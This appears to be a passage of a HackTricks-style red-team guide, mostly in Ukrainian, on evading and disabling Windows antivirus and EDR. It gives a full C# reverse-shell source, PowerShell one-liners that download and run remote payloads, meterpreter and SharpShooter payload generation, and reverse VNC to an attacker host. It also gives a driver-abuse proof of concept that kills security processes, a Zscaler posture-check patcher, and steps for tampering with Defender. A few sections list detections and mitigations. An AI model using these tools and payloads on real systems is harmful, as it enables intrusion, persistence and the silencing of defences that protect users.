<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм логування у Windows, який дозволяє applications і system components **логувати події**. Однак його також можуть використовувати security products для моніторингу та виявлення malicious activities.

Подібно до того, як AMSI вимикається (bypassed), також можливо змусити функцію **`EtwEventWrite`** процесу user space повертатися одразу без логування будь-яких подій. Це робиться шляхом патчингу функції в пам’яті так, щоб вона поверталася негайно, фактично вимикаючи ETW logging для цього процесу.

Більше інформації можна знайти в **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Завантаження C# binaries у пам’ять відоме вже досить давно, і це й досі дуже хороший спосіб запускати ваші post-exploitation tools без ризику бути спійманими AV.

Оскільки payload буде завантажено напряму в пам’ять без запису на диск, нам потрібно буде турбуватися лише про патчинг AMSI для всього процесу.

Більшість C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) уже надають можливість виконувати C# assemblies напряму в пам’яті, але є різні способи це робити:

- **Fork\&Run**

Це передбачає **створення нового sacrificial process**, інжекцію вашого post-exploitation malicious code у цей новий process, виконання вашого malicious code і, після завершення, завершення нового process. Це має і свої переваги, і свої недоліки. Перевага методу fork and run у тому, що виконання відбувається **поза** процесом нашого Beacon implant. Це означає, що якщо щось у нашій post-exploitation дії піде не так або буде виявлено, є **набагато більший шанс**, що наш **implant виживе.** Недолік у тому, що є **вищий шанс** бути виявленими **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Йдеться про інжекцію post-exploitation malicious code **у власний process**. Так можна уникнути створення нового process і його сканування AV, але недолік у тому, що якщо щось піде не так під час виконання вашого payload, є **набагато більший шанс** **втратити ваш beacon**, оскільки він може впасти.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо ви хочете прочитати більше про завантаження C# Assembly, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їхній InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ви також можете завантажувати C# Assemblies **з PowerShell**, перегляньте [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можна виконувати malicious code, використовуючи інші мови, надаючи compromised machine доступ **до interpreter environment, встановленого на Attacker Controlled SMB share**.

Надавши доступ до Interpreter Binaries та середовища на SMB share, ви можете **виконувати arbitrary code на цих мовах у пам’яті** compromised machine.

У репозиторії зазначено: Defender все ще сканує scripts, але використовуючи Go, Java, PHP тощо, ми маємо **більше гнучкості для обходу static signatures**. Тестування на випадкових reverse shell scripts без obfuscation на цих мовах показало успіх.

## TokenStomping

Token stomping — це техніка, що дозволяє attacker **маніпулювати access token або security prouct, таким як EDR чи AV**, зменшуючи його privileges так, щоб process не завершився, але й не мав permissions перевіряти malicious activities.

Щоб цьому запобігти, Windows може **обмежити external processes** від отримання handles до tokens security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Як описано в [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), досить просто розгорнути Chrome Remote Desktop на PC жертви, а потім використати його, щоб takeover it і зберегти persistence:
1. Завантажте з https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім натисніть на MSI file для Windows, щоб завантажити MSI file.
2. Запустіть installer silently на жертві (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть next. Wizard потім попросить вас authorize; натисніть кнопку Authorize, щоб продовжити.
4. Виконайте наданий parameter з деякими adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Зверніть увагу на параметр pin, який дозволяє встановити pin без використання GUI).


## Advanced Evasion

Evasion — дуже складна тема, іноді потрібно враховувати багато різних джерел telemetry лише в одній system, тож майже неможливо залишатися повністю невиявленим у mature environments.

У кожному середовищі, проти якого ви працюєте, будуть свої сильні та слабкі сторони.

Дуже рекомендую вам подивитися цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати базове розуміння більш Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це також ще одна чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Ви можете використати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видалятиме частини binary** доти, доки не **з’ясує, яку саме частину Defender** вважає malicious, і покаже її вам.\
Ще один tool, що робить **те саме — це** [**avred**](https://github.com/dobin/avred) з відкритим web, який надає сервіс за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 усі Windows постачалися з **Telnet server**, який можна було встановити (as administrator), виконавши:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Зробіть так, щоб воно **start** під час запуску системи і **run** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змінити порт telnet** (stealth) і вимкнути firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Завантажте це з: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (потрібні bin downloads, а не setup)

**ON THE HOST**: Запустіть _**winvnc.exe**_ і налаштуйте server:

- Увімкніть опцію _Disable TrayIcon_
- Встановіть пароль у _VNC Password_
- Встановіть пароль у _View-Only Password_

Потім перемістіть binary _**winvnc.exe**_ і **щойно** створений файл _**UltraVNC.ini**_ всередину **victim**

#### **Reverse connection**

**attacker** повинен **виконати всередині** свого **host** binary `vncviewer.exe -listen 5900`, щоб він був **готовий** прийняти reverse **VNC connection**. Потім, всередині **victim**: Запустіть winvnc daemon `winvnc.exe -run` і запустіть `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Щоб зберегти stealth, ви не повинні робити кілька речей

- Не запускайте `winvnc`, якщо він уже працює, інакше ви викличете [popup](https://i.imgur.com/1SROTTl.png). перевірте, чи він працює, за допомогою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тій самій директорії, інакше відкриється [the config window](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для help, інакше ви викличете [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте це з: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Всередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний defender дуже швидко завершує процес.**

### Компілюємо власний reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його з:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use it with:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Використання python для прикладу build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 скористався маленькою консольною утилітою, відомою як **Antivirus Terminator**, щоб вимкнути endpoint protections перед запуском ransomware. Інструмент приносить свій **власний вразливий, але *signed* driver** і зловживає ним, щоб виконувати привілейовані kernel operations, які навіть Protected-Process-Light (PPL) AV services не можуть заблокувати.

Key take-aways
1. **Signed driver**: Файл, що доставляється на диск, це `ServiceMouse.sys`, але бінарний файл — це легітимно signed driver `AToolsKrnl64.sys` з Antiy Labs’ “System In-Depth Analysis Toolkit”. Оскільки driver має дійсний Microsoft signature, він завантажується навіть коли Driver-Signature-Enforcement (DSE) увімкнено.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Перша лінія реєструє driver як **kernel service**, а друга запускає його так, щоб `\\.\ServiceMouse` став доступним з user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD обходить user-mode protections повністю; code that executes in the kernel can open *protected* processes, terminate them, or tamper with kernel objects незалежно від PPL/PP, ELAM чи інших hardening features.

Detection / Mitigation
•  Enable Microsoft’s vulnerable-driver block list (`HVCI`, `Smart App Control`) so Windows refuses to load `AToolsKrnl64.sys`.
•  Monitor creations of new *kernel* services and alert when a driver is loaded from a world-writable directory or not present on the allow-list.
•  Watch for user-mode handles to custom device objects followed by suspicious `DeviceIoControl` calls.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** застосовує device-posture rules локально і покладається на Windows RPC, щоб передавати результати іншим компонентам. Два слабкі дизайнерські рішення роблять повний bypass можливим:

1. Posture evaluation відбувається **повністю на client-side** (до server надсилається boolean).
2. Internal RPC endpoints лише перевіряють, що executable, який підключається, **signed by Zscaler** (через `WinVerifyTrust`).

Шляхом **patching four signed binaries on disk** обидва механізми можна нейтралізувати:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Always returns `1` so every check is compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Після заміни оригінальних файлів і перезапуску стеку сервісів:

* **Усі** posture checks показують **green/compliant**.
* Unsigned або modified binaries можуть відкривати named-pipe RPC endpoints (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує unrestricted доступ до internal network, визначеної політиками Zscaler.

Цей case study демонструє, як decisions довіри лише на client-side та прості signature checks можуть бути обійдені кількома byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) enforce-ить signer/level hierarchy так, щоб лише processes із рівнем захисту equal-or-higher могли tamper один з одним. Offensively, якщо ви можете legitimately запустити PPL-enabled binary і контролювати його arguments, ви можете перетворити benign functionality (наприклад, logging) на constrained, PPL-backed write primitive проти protected directories, які використовуються AV/EDR.

Що робить process таким, що працює як PPL
- Target EXE (і будь-які loaded DLLs) мають бути signed with a PPL-capable EKU.
- Process має бути створений з CreateProcess із flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно запросити compatible protection level, що відповідає signer binary (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для anti-malware signers, `PROTECTION_LEVEL_WINDOWS` для Windows signers). Wrong levels призведуть до creation failure.

Див. також ширший вступ до PP/PPL і LSASS protection тут:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Підписаний системний бінарний файл `C:\Windows\System32\ClipUp.exe` самостійно створює дочірній процес і приймає параметр для запису log file у шлях, заданий викликом.
- When launched as a PPL process, file write occurs with PPL backing.
- ClipUp не може парсити шляхи, що містять spaces; використовуйте 8.3 short paths, щоб вказувати на зазвичай захищені locations.

8.3 short path helpers
- Перелічити short names: `dir /x` у кожному parent directory.
- Отримати short path у cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Запустіть PPL-capable LOLBIN (ClipUp) з `CREATE_PROTECTED_PROCESS` за допомогою launcher (наприклад, CreateProcessAsPPL).
2) Передайте аргумент log-path для ClipUp, щоб примусити створення file у protected AV directory (наприклад, Defender Platform). За потреби використовуйте 8.3 short names.
3) Якщо target binary зазвичай відкритий/locked by the AV під час роботи (наприклад, MsMpEng.exe), заплануйте write на boot до старту AV, встановивши auto-start service, який гарантовано запускається раніше. Перевірте boot ordering за допомогою Process Monitor (boot logging).
4) Після reboot PPL-backed write відбудеться до того, як AV заблокує свої binaries, пошкоджуючи target file і запобігаючи startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- You cannot control the contents ClipUp writes beyond placement; the primitive is suited to corruption rather than precise content injection.
- Requires local admin/SYSTEM to install/start a service and a reboot window.
- Timing is critical: the target must not be open; boot-time execution avoids file locks.

Detections
- Process creation of `ClipUp.exe` with unusual arguments, especially parented by non-standard launchers, around boot.
- New services configured to auto-start suspicious binaries and consistently starting before Defender/AV. Investigate service creation/modification prior to Defender startup failures.
- File integrity monitoring on Defender binaries/Platform directories; unexpected file creations/modifications by processes with protected-process flags.
- ETW/EDR telemetry: look for processes created with `CREATE_PROTECTED_PROCESS` and anomalous PPL level usage by non-AV binaries.

Mitigations
- WDAC/Code Integrity: restrict which signed binaries may run as PPL and under which parents; block ClipUp invocation outside legitimate contexts.
- Service hygiene: restrict creation/modification of auto-start services and monitor start-order manipulation.
- Ensure Defender tamper protection and early-launch protections are enabled; investigate startup errors indicating binary corruption.
- Consider disabling 8.3 short-name generation on volumes hosting security tooling if compatible with your environment (test thoroughly).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Preconditions
- Local Administrator (needed to create directories/symlinks under the Platform folder)
- Ability to reboot or trigger Defender platform re-selection (service restart on boot)
- Only built-in tools required (mklink)

Why it works
- Defender blocks writes in its own folders, but its platform selection trusts directory entries and picks the lexicographically highest version without validating that the target resolves to a protected/trusted path.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть симлінк каталогу з вищою версією всередині Platform, що вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендовано перезавантаження):
```cmd
shutdown /r /t 0
```
4) Перевірте, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Ви повинні спостерігати новий шлях процесу в `C:\TMP\AV\` і конфігурацію/реєстр service, що відображають це розташування.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs that Defender loads from its application directory to execute code in Defender’s processes. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remove the version-symlink so on next start the configured path doesn’t resolve and Defender fails to start:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Зауважте, що ця technique сама по собі не надає privilege escalation; для цього потрібні admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams можуть перенести runtime evasion із C2 implant у сам target module, hook-нувши його Import Address Table (IAT) і спрямовуючи вибрані APIs через attacker-controlled, position‑independent code (PIC). Це узагальнює evasion за межі невеликої API surface, яку відкривають багато kits (наприклад, CreateProcessA), і поширює ті самі protections на BOFs і post‑exploitation DLLs.

High-level approach
- Розмістіть PIC blob поруч із target module за допомогою reflective loader (prepended або companion). PIC має бути self-contained і position-independent.
- Коли host DLL завантажується, пройдіть його IMAGE_IMPORT_DESCRIPTOR і пропатчте IAT entries для target imports (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі PIC wrappers.
- Кожен PIC wrapper виконує evasions перед tail-calling real API address. Типові evasions включають:
- Memory mask/unmask around the call (наприклад, encrypt beacon regions, RWX→RX, change page names/permissions), а потім restore post‑call.
- Call-stack spoofing: побудова benign stack і transition у target API так, щоб call-stack analysis повертало очікувані frames.
- Для compatibility export-ніть interface, щоб Aggressor script (або еквівалент) міг реєструвати, які APIs hook-ати для Beacon, BOFs і post-ex DLLs.

Why IAT hooking here
- Працює для будь-якого code, який використовує hooked import, без зміни tool code або залежності від Beacon для proxying specific APIs.
- Покриває post-ex DLLs: hook-інг LoadLibrary* дає змогу intercept-ити module loads (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати те саме masking/stack evasion до їхніх API calls.
- Відновлює надійне використання process-spawning post-ex commands проти call-stack–based detections шляхом wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Примітки
- Застосуйте патч після relocations/ASLR і до першого використання import. Reflective loaders на кшталт TitanLdr/AceLdr демонструють hooking під час DllMain завантаженого модуля.
- Тримайте wrappers крихітними та PIC-safe; розв’язуйте справжній API через оригінальне значення IAT, яке ви зберегли до patching, або через LdrGetProcedureAddress.
- Використовуйте RW → RX transitions для PIC і не залишайте сторінки writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs будують фейковий call chain (return addresses у benign modules), а потім pivot into real API.
- Це обходить detections, які очікують canonical stacks від Beacon/BOFs до sensitive APIs.
- Поєднуйте зі stack cutting та stack stitching techniques, щоб потрапити всередину очікуваних frames перед API prologue.

Operational integration
- Додавайте reflective loader перед post-ex DLLs, щоб PIC і hooks ініціалізувалися автоматично, коли DLL завантажується.
- Використовуйте Aggressor script для реєстрації target APIs, щоб Beacon і BOFs прозоро отримували вигоду від того самого path evasion без змін коду.

Detection/DFIR considerations
- IAT integrity: entries, що резолвляться в non-image (heap/anon) addresses; періодична verification import pointers.
- Stack anomalies: return addresses, що не належать loaded images; різкі transitions до non-image PIC; inconsistent RtlCurrentUserThreadStart ancestry.
- Loader telemetry: in-process writes to IAT, рання DllMain activity, що модифікує import thunks, unexpected RX regions created at load.
- Image-load evasion: якщо hooking LoadLibrary*, monitor suspicious loads automation/clr assemblies, пов’язані з memory masking events.

Related building blocks and examples
- Reflective loaders, що виконують IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

If you control a reflective loader, you can hook imports **during** `ProcessImports()` by replacing the loader's `GetProcAddress` pointer with a custom resolver that checks hooks first:

- Build a **resident PICO** (persistent PIC object) that survives after the transient loader PIC frees itself.
- Export a `setup_hooks()` function that overwrites the loader's import resolver (e.g., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, skip ordinal imports and use a hash-based hook lookup like `__resolve_hook(ror13hash(name))`. If a hook exists, return it; otherwise delegate to the real `GetProcAddress`.
- Register hook targets at link time with Crystal Palace `addhook "MODULE$Func" "hook"` entries. The hook stays valid because it lives inside the resident PICO.

This yields **import-time IAT redirection** without patching the loaded DLL's code section post-load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks only trigger if the function is actually in the target's IAT. If a module resolves APIs via a PEB-walk + hash (no import entry), force a real import so the loader's `ProcessImports()` path sees it:

- Replace hashed export resolution (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) with a direct reference like `&WaitForSingleObject`.
- The compiler emits an IAT entry, enabling interception when the reflective loader resolves imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Instead of patching `Sleep`, hook the **actual wait/IPC primitives** the implant uses (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). For long waits, wrap the call in an Ekko-style obfuscation chain that encrypts the in-memory image during idle:

- Use `CreateTimerQueueTimer` to schedule a sequence of callbacks that call `NtContinue` with crafted `CONTEXT` frames.
